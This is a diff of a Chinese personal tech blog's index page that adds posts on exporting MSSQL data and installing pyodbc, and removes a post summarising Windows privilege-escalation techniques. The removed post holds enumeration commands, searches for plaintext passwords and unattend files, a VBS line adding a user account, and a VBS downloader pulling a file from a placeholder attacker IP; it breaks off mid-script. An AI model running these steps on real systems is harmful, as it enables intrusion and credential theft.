@@ -232,11 +232,11 @@ var _hmt = _hmt || [];
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">TensorFlow</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Python</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Python</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">TensorFlow</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
@@ -492,6 +492,89 @@ var _hmt = _hmt || [];
 
 
   
+    <article id="post-MSSQL-导数据出为sql文件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/others/MSSQL-导数据出为sql文件/">MSSQL 导数据出为sql文件</a>
+    </h1>
+  
+
+        
+        <a href="/others/MSSQL-导数据出为sql文件/" class="archive-article-date">
+  	<time datetime="2017-02-21T02:29:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-21</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ol>
+<li>选中要导出的数据库–&gt;任务–&gt;生成脚本</li>
+<li>现“生成和发布脚本”窗口，点击下一步</li>
+<li>选择要编写脚本的数据库对象，全部导出选第一个，如果你想导出部分数据勾选    第二个就好了</li>
+<li>出现这个画面后点击”高级”按钮（重点）</li>
+<li>”要编写脚本的数据的类型”对应：”架构和数据”</li>
+<li>确定、下一步、下一步、大功告成。</li>
+</ol>
+<blockquote>
+<p><a href="http://www.lihuoqing.cn/code/130.html" target="_blank" rel="external">原文</a><br>做个备份</p>
+</blockquote>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">数据处理</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/others/" class="article-tag-list-link color2">others</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/others/MSSQL-导数据出为sql文件/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-自动化运维工具-Ansible" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -707,6 +790,105 @@ var _hmt = _hmt || [];
 
 
   
+    <article id="post-Python-pyodbc-连接SQL-Server" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/devops/Python-pyodbc-连接SQL-Server/">Python pyodbc 连接SQL Server</a>
+    </h1>
+  
+
+        
+        <a href="/devops/Python-pyodbc-连接SQL-Server/" class="archive-article-date">
+  	<time datetime="2017-01-22T14:28:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-22</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+<p>最近在处理数据，有一批数据是在MSSQL中的，打算导出整理后扔到MongoDB中<br>网上找了下 Python有个叫pyodbc的库，自己本地在Mac上跑起来没啥问题，<br>不过将脚本迁移到Server上run的时候遇到了些问题，所以记录下</p>
+</blockquote>
+<h2 id="Run-On-Mac"><a href="#Run-On-Mac" class="headerlink" title="Run On Mac"></a>Run On Mac</h2><blockquote>
+<p>直接安装微软官方的安装教程，就能跑起来</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ruby <span class="_">-e</span> <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)</span>"</span></div><div class="line">brew tap microsoft/msodbcsql https://github.com/Microsoft/homebrew-msodbcsql</div><div class="line">brew update</div><div class="line">brew install msodbcsql</div><div class="line"><span class="comment">#for silent install ACCEPT_EULA=y brew install msodbcsql</span></div><div class="line">sudo pip install pyodbc==3.1.1</div></pre></td></tr></table></figure>
+<h2 id="Run-On-CentOS-Server"><a href="#Run-On-CentOS-Server" class="headerlink" title="Run On CentOS Server"></a>Run On CentOS Server</h2><blockquote>
+<p>服务器用的是CentOS<br>需要先安装gcc和python-devel</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install python-devel gcc -y</div></pre></td></tr></table></figure>
+<blockquote>
+<p>然后再安装微软的这个<a href="https://docs.microsoft.com/en-us/sql/connect/odbc/linux/installing-the-microsoft-odbc-driver-for-sql-server-on-linux" target="_blank" rel="external">教程</a>来,就能跑起来了，<br>我的是CentOS 7,所以安装步骤为</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">sudo su</div><div class="line">curl https://packages.microsoft.com/config/rhel/7/prod.repo &gt; /etc/yum.repos.d/mssql-release.repo</div><div class="line"><span class="built_in">exit</span></div><div class="line">sudo yum remove unixODBC-utf16 unixODBC-utf16-devel <span class="comment">#to avoid conflicts</span></div><div class="line">sudo ACCEPT_EULA=Y yum install msodbcsql-13.1.4.0-1 mssql-tools-14.0.3.0-1 unixODBC-devel</div></pre></td></tr></table></figure>
+<blockquote>
+<p>而且我用的是zsh，所以后将相关环境变量放到zshrc就好了</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="string">'export PATH="$PATH:/opt/mssql-tools/bin"'</span> &gt;&gt; ~/.zshrc</div><div class="line"><span class="built_in">echo</span> <span class="string">'export PATH="$PATH:/opt/mssql-tools/bin"'</span> &gt;&gt; ~/.zshrc</div><div class="line"><span class="built_in">source</span> ~/.zshrc</div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Linux</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Python</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">SQL Server</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/devops/" class="article-tag-list-link color2">devops</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/devops/Python-pyodbc-连接SQL-Server/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-一些前端工具" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -876,249 +1058,6 @@ var _hmt = _hmt || [];
 
 
   
-    <article id="post-Windows-提权方法总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/sec/Windows-提权方法总结/">Windows 提权方法总结</a>
-    </h1>
-  
-
-        
-        <a href="/sec/Windows-提权方法总结/" class="archive-article-date">
-  	<time datetime="2016-11-23T04:34:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-11-23</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="文章来源"><a href="#文章来源" class="headerlink" title="文章来源"></a>文章来源</h1><blockquote>
-<p>BASIC WINDOWS PRIVILEGE ESCALATION<br><a href="https://thel3l.me/blog/winprivesc/index.html" target="_blank" rel="external">https://thel3l.me/blog/winprivesc/index.html</a><br>由于原文有些命令在中文Windows下无效，所以另外整理了下</p>
-</blockquote>
-<h2 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h2><h3 id="获取系统名称和版本"><a href="#获取系统名称和版本" class="headerlink" title="获取系统名称和版本"></a>获取系统名称和版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">C:\Windows\system32&gt;systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</div><div class="line">OS 名称:          Microsoft Windows 10 专业版</div><div class="line">OS 版本:          10.0.14393 暂缺 Build 14393</div></pre></td></tr></table></figure>
-<h3 id="检查系统版本位数"><a href="#检查系统版本位数" class="headerlink" title="检查系统版本位数"></a>检查系统版本位数</h3><blockquote>
-<p>如果是64位系统则返回”AMD64”否则返回”X86”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:\&gt;echo %PROCESSOR_ARCHITECTURE%</div><div class="line">AMD64</div></pre></td></tr></table></figure></p>
-</blockquote>
-<p><img src="https://ww4.sinaimg.cn/large/006tNc79gy1fdtl6jx3l1j307x01c742.jpg" alt="X86"></p>
-<h3 id="查看系统所有环境变量"><a href="#查看系统所有环境变量" class="headerlink" title="查看系统所有环境变量"></a>查看系统所有环境变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">C:\&gt;SET</div><div class="line">ALLUSERSPROFILE=C:\ProgramData</div><div class="line">APPDATA=C:\Users\V\AppData\Roaming</div><div class="line">CommonProgramFiles=C:\Program Files\Common Files</div><div class="line">CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files</div><div class="line">CommonProgramW6432=C:\Program Files\Common Files</div><div class="line">COMPUTERNAME=V_V</div><div class="line">ComSpec=C:\Windows\system32\cmd.exe</div></pre></td></tr></table></figure>
-<h3 id="查看计算机所有用户"><a href="#查看计算机所有用户" class="headerlink" title="查看计算机所有用户"></a>查看计算机所有用户</h3><blockquote>
-<p>NET USER</p>
-</blockquote>
-<p><img src="https://ww2.sinaimg.cn/large/006tNc79gy1fdtl70ffyfj30ev03uaa1.jpg" alt="net user"></p>
-<h3 id="查看指定用户详细详细"><a href="#查看指定用户详细详细" class="headerlink" title="查看指定用户详细详细"></a>查看指定用户详细详细</h3><blockquote>
-<p>NET USER USERNAME<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">C:\&gt;net user Administrator</div><div class="line">用户名                 Administrator</div><div class="line">全名</div><div class="line">注释                   管理计算机(域)的内置帐户</div><div class="line">用户的注释</div><div class="line">国家/地区代码          000 (系统默认值)</div><div class="line">帐户启用               No</div><div class="line">帐户到期               从不</div><div class="line"></div><div class="line">上次设置密码           2016/9/18 10:40:15</div><div class="line">密码到期               从不</div><div class="line">密码可更改             2016/9/18 10:40:15</div><div class="line">需要密码               Yes</div><div class="line">用户可以更改密码       Yes</div><div class="line"></div><div class="line">允许的工作站           All</div><div class="line">登录脚本</div><div class="line">用户配置文件</div><div class="line">主目录</div><div class="line">上次登录               从不</div><div class="line"></div><div class="line">可允许的登录小时数     All</div><div class="line"></div><div class="line">本地组成员             *Administrators       *Ssh Users</div><div class="line">全局组成员             *None</div><div class="line">命令成功完成。</div></pre></td></tr></table></figure></p>
-</blockquote>
-<h2 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h2><h3 id="查看基本网络情况"><a href="#查看基本网络情况" class="headerlink" title="查看基本网络情况"></a>查看基本网络情况</h3><blockquote>
-<p>IPCONFIG /ALL</p>
-</blockquote>
-<p><img src="https://ww2.sinaimg.cn/large/006tNc79gy1fdtl70ffyfj30ev03uaa1.jpg" alt="IPCONFIG /ALL"></p>
-<h3 id="查看路由表"><a href="#查看路由表" class="headerlink" title="查看路由表"></a>查看路由表</h3><blockquote>
-<p>route print</p>
-</blockquote>
-<p><img src="https://ww3.sinaimg.cn/large/006tNc79gy1fdtl80ixw0j30hy082mxy.jpg" alt="路由表信息"></p>
-<h3 id="查看ARP缓存"><a href="#查看ARP缓存" class="headerlink" title="查看ARP缓存"></a>查看ARP缓存</h3><blockquote>
-<p>arp -A</p>
-</blockquote>
-<p><img src="https://ww2.sinaimg.cn/large/006tNc79gy1fdtl97ytiqj30ba06f3yq.jpg" alt="ARP缓存"></p>
-<h3 id="防火墙相关"><a href="#防火墙相关" class="headerlink" title="防火墙相关"></a>防火墙相关</h3><blockquote>
-<p>查看端口占用情况<br>netstat -ano</p>
-</blockquote>
-<p><img src="https://ww2.sinaimg.cn/large/006tNc79gy1fdtl9l7il6j30gy0hqta9.jpg" alt="netstat -ano"></p>
-<blockquote>
-<p>防火墙配置<br>netsh firewall show config<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">C:\&gt;netsh firewall show config</div><div class="line"></div><div class="line">域 配置文件配置:</div><div class="line">-------------------------------------------------------------------</div><div class="line">操作模式                          = 启用</div><div class="line">例外模式                          = 启用</div><div class="line">多播/广播响应模式                 = 启用</div><div class="line">通知模式                          = 启用</div><div class="line"></div><div class="line">域 配置文件的允许的程序配置:</div><div class="line">模式     流量方向             名称/程序</div><div class="line">-------------------------------------------------------------------</div><div class="line"></div><div class="line">域 配置文件的端口配置:</div><div class="line">端口   协议    流量方向              名称</div><div class="line">-------------------------------------------------------------------</div><div class="line"></div><div class="line">域 配置文件的 ICMP 配置:</div><div class="line">模式     类型  描述</div><div class="line">-------------------------------------------------------------------</div><div class="line">启用       2     允许出站数据包太大</div></pre></td></tr></table></figure></p>
-<p>防火墙状态<br>netsh firewall show state<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">C:\&gt;netsh firewall show state</div><div class="line"></div><div class="line">防火墙状态:</div><div class="line">-------------------------------------------------------------------</div><div class="line">配置文件                          = 标准</div><div class="line">操作模式                          = 禁用</div><div class="line">例外模式                          = 启用</div><div class="line">多播/广播响应模式                 = 启用</div><div class="line">通知模式                          = 启用</div><div class="line">组策略版本                        = Windows 防火墙</div><div class="line">远程管理模式                      = 禁用</div><div class="line"></div><div class="line">所有网络接口上的端口当前均为打开状态:</div><div class="line">端口   协议  版本  程序</div><div class="line">-------------------------------------------------------------------</div><div class="line">当前没有在所有网络接口上打开的端口。</div><div class="line"></div><div class="line">重要信息: 已成功执行命令。</div><div class="line">但不赞成使用 &quot;netsh firewall&quot;；</div><div class="line">而应该使用 &quot;netsh advfirewall firewall&quot;。</div><div class="line">有关使用 &quot;netsh advfirewall firewall&quot; 命令</div><div class="line">而非 &quot;netsh firewall&quot; 的详细信息，请参阅</div><div class="line">http://go.microsoft.com/fwlink/?linkid=121488</div><div class="line">上的 KB 文章 947709。</div></pre></td></tr></table></figure></p>
-</blockquote>
-<h2 id="应用程序和服务"><a href="#应用程序和服务" class="headerlink" title="应用程序和服务"></a>应用程序和服务</h2><h3 id="查看正在运行的程序和服务"><a href="#查看正在运行的程序和服务" class="headerlink" title="查看正在运行的程序和服务"></a>查看正在运行的程序和服务</h3><blockquote>
-<p>schtasks /QUERY /fo LIST /v<br>以list的形式输入详细信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">主机名:                             VVV</div><div class="line">任务名:                             \Microsoft\XblGameSave\XblGameSaveTaskLogon</div><div class="line">下次运行时间:                       N/A</div><div class="line">模式:                               就绪</div><div class="line">登录状态:                           交互方式/后台方式</div><div class="line">上次运行时间:                       2016/9/17 21:05:59</div><div class="line">上次结果:                           0</div><div class="line">创建者:                             Microsoft</div><div class="line">要运行的任务:                       %windir%\System32\XblGameSaveTask.exe logon</div><div class="line">起始于:                             N/A</div><div class="line">注释:                               XblGameSave Logon Task</div><div class="line">计划任务状态:                       已启用</div><div class="line">空闲时间:                           仅在空闲  分钟后启动, 如果没空闲，重试  分钟 如果空闲结束，停止任务</div><div class="line">电源管理:                           不用电池启动</div><div class="line">作为用户运行:                       SYSTEM</div><div class="line">删除没有计划的任务:                 已禁用</div><div class="line">如果运行了 X 小时 X 分钟，停止任务: 02:00:00</div><div class="line">计划:                               计划数据在此格式中不可用。</div><div class="line">计划类型:                           登陆时</div><div class="line">开始时间:                           N/A</div><div class="line">开始日期:                           N/A</div><div class="line">结束日期:                           N/A</div><div class="line">天:                                 N/A</div><div class="line">月:                                 N/A</div><div class="line">重复: 每:                           N/A</div><div class="line">重复: 截止: 时间:                   N/A</div><div class="line">重复: 截止: 持续时间:               N/A</div><div class="line">重复: 如果还在运行，停止:           N/A</div></pre></td></tr></table></figure></p>
-</blockquote>
-<h3 id="查看服务的进程ID"><a href="#查看服务的进程ID" class="headerlink" title="查看服务的进程ID"></a>查看服务的进程ID</h3><blockquote>
-<p>tasklist /SVC</p>
-</blockquote>
-<p><img src="https://ww3.sinaimg.cn/large/006tNc79gy1fdtla4rkggj30fx0bgt9g.jpg" alt="tasklist /SVC"></p>
-<h3 id="查看已安装的驱动程序列表"><a href="#查看已安装的驱动程序列表" class="headerlink" title="查看已安装的驱动程序列表"></a>查看已安装的驱动程序列表</h3><blockquote>
-<p>DRIVERQUERY<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">C:\&gt;DRIVERQUERY</div><div class="line"></div><div class="line">模块名       显示名称               驱动程序类型  链接日期</div><div class="line">============ ====================== ============= ======================</div><div class="line">1394ohci     1394 OHCI Compliant Ho Kernel        2016/7/16 10:21:36</div><div class="line">3ware        3ware                  Kernel        2015/5/19 6:28:03</div><div class="line">ACPI         Microsoft ACPI Driver  Kernel        2016/7/16 10:10:47</div><div class="line">AcpiDev      ACPI 设备驱动程序      Kernel        2016/7/16 10:29:10</div><div class="line">acpiex       Microsoft ACPIEx Drive Kernel        2016/7/16 10:28:23</div><div class="line">acpipagr     ACPI 处理器聚合器驱动  Kernel        2016/7/16 10:29:00</div><div class="line">AcpiPmi      ACPI 电源表驱动程序    Kernel        2016/7/16 10:19:44</div><div class="line">acpitime     ACPI 唤醒警报驱动程序  Kernel        2016/7/16 10:29:20</div></pre></td></tr></table></figure></p>
-</blockquote>
-<h3 id="也可以通过WMIC获取更多信息"><a href="#也可以通过WMIC获取更多信息" class="headerlink" title="也可以通过WMIC获取更多信息"></a>也可以通过WMIC获取更多信息</h3><blockquote>
-<p>查看已安装程序相关信息(包括程序名、供应商、版本、识别号等)<br>Caption、Identifying Number 、Name、Vendor、Version<br>比如我安装的XShell相关信息如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Xshell 5</div><div class="line">&#123;F3FDFD5A-A201-407B-887F-399484764ECA&#125;</div><div class="line">Xshell 5</div><div class="line">NetSarang Computer, Inc.</div><div class="line">5.0.0983</div></pre></td></tr></table></figure></p>
-<p>按照类似的方法还可以获取 服务、进程、和启动项相关信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># Lists services</div><div class="line">wmic service list brief</div><div class="line"># Lists processes</div><div class="line">wmic process list brief</div><div class="line"># Lists startup items</div><div class="line">wmic startup list brief</div></pre></td></tr></table></figure></p>
-<p>查看是否有可作为非特权用户执行的msi文件<br>如果没有则会返回”错误: 系统找不到指定的注册表项或值。”</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</div><div class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</div></pre></td></tr></table></figure>
-<blockquote>
-<p>查看setuid或setgid是否被修改过<br>只存在于Windows Servers中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reg query HKEY_Local_Machine\System\CurrentControlSet\Services\NfsSvr\Parameters\SafeSetUidGidBits</div></pre></td></tr></table></figure></p>
-<p>查看系统更新记录<br> wmic qfe get Caption,Description,HotFixID,InstalledOn<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">C:\Windows\system32&gt;wmic qfe get Caption,Description,HotFixID,InstalledOn</div><div class="line">Caption                                     Description      HotFixID   InstalledOn</div><div class="line">http://support.microsoft.com/?kbid=3176936  Update           KB3176936  8/26/2016</div><div class="line">http://support.microsoft.com/?kbid=3188128  Security Update  KB3188128  9/16/2016</div><div class="line">http://support.microsoft.com/?kbid=3189866  Security Update  KB3189866  9/16/2016</div></pre></td></tr></table></figure></p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#还可以搜索可提升权限的特定漏洞，比如</div><div class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB3189031&quot;</div><div class="line">#如果没有返回信息则说明没安装该补丁</div></pre></td></tr></table></figure>
-<p>##敏感数据和目录</p>
-<blockquote>
-<p>搜索未加密的密码或其它敏感信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">#进入系统盘根目录</div><div class="line">cd/</div><div class="line">#返回该分区所有名为password.txt的文件的路径</div><div class="line">dir /b/s password.txt</div><div class="line">#返回该分区所有以config开头的文件的路径</div><div class="line">dir /b/s config.*</div><div class="line">#在特定格式的文件中搜索特定信息，比如</div><div class="line">findstr /si password *.xml *.ini *.txt</div><div class="line">findstr /si login *.xml *.ini *.txt</div></pre></td></tr></table></figure></p>
-<p>在一些大型企业中，系统可能是通过脚本自动安装的，一些文件中可能存在包含base64编码的日志，这些文件一般位于如下路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">C:\sysprep.inf</div><div class="line">C:\sysprep\sysprep.xml</div><div class="line">C:\Windows\Panther\Unattend\Unattended.xml</div><div class="line">C:\Windows\Panther\Unattended.xml</div></pre></td></tr></table></figure></p>
-</blockquote>
-<p>##文件系统</p>
-<blockquote>
-<p>了解有什么样的访问权限、可访问目录等</p>
-<p>###使用其他语言绕过一些限制<br>以Python为例(如果目标机器安装了Python)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">C:\&gt;python</div><div class="line">Python 2.7.12 (v2.7.12:d33e0cf91556, Jun 27 2016, 15:24:40) [MSC v.1500 64 bit (AMD64)] on win32</div><div class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</div><div class="line">&gt;&gt;&gt; import os; os.system(&quot;cmd /c net user&quot;)</div><div class="line"></div><div class="line">\\VV 的用户帐户</div><div class="line"></div><div class="line">-------------------------------------------------------------------------------</div><div class="line">Administrator            DefaultAccount           defaultuser0</div><div class="line">Guest                    Junhu</div><div class="line">命令成功完成。</div></pre></td></tr></table></figure></p>
-<p>使用VBS脚本</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">D:\&gt;copy con commandExec1.vbs</div><div class="line">Call WScript.CreateObject(&quot;Wscript.Shell&quot;).Run(&quot;cmd /K net user demo /add&quot;, 8, True)^Z</div><div class="line">已复制         1 个文件。</div><div class="line"></div><div class="line">D:\&gt;commandExec1.vbs</div></pre></td></tr></table></figure>
-<p>###或者通过打开一个ftp来执行相关命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#使用copy con创建批处理文件,输入&quot;ftp&quot;按CTRL+z后回车，即可创建成功</div><div class="line">copy con run_ftp.bat</div><div class="line">#运行文件</div><div class="line">run_ftp.bat</div><div class="line">ftp&gt;!dir</div></pre></td></tr></table></figure></p>
-<p>###检查可写文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dir /a-r-d /s /b</div></pre></td></tr></table></figure></p>
-<p>##使用脚本</p>
-<p>###使用VB脚本下载相应东西到目标主机</p>
-<blockquote>
-<p>来自 <a href="http://superuser.com/questions/59465/is-it-possible-to-download-using-the-windows-command-line/59489#59489" target="_blank" rel="external">Igor</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">&apos; downloadfile.vbs</div><div class="line">&apos; Set your settings</div><div class="line">strFileURL = &quot;http://&#123;YOUR_IP&#125;/&#123;FILE_NAME.EXT&#125;&quot;</div><div class="line">strHDLocation = &quot;c:\\&#123;FILE_NAME.EXT&#125;&quot;</div><div class="line"></div><div class="line">&apos; Fetch the file</div><div class="line">Set objXMLHTTP = CreateObject(&quot;MSXML2.XMLHTTP&quot;)</div><div class="line"></div><div class="line">objXMLHTTP.open &quot;GET&quot;, strFileURL, false</div><div class="line">objXMLHTTP.send()</div><div class="line"></div><div class="line">If objXMLHTTP.Status = 200 Then</div><div class="line">Set objADOStream = CreateObject(&quot;ADODB.Stream&quot;)</div><div class="line">objADOStream.Open</div><div class="line">objADOStream.Type = 1 &apos;adTypeBinary</div><div class="line"></div><div class="line">objADOStream.Write objXMLHTTP.ResponseBody</div><div class="line">objADOStream.Position = 0 &apos;Set the stream position to the start</div><div class="line"></div><div 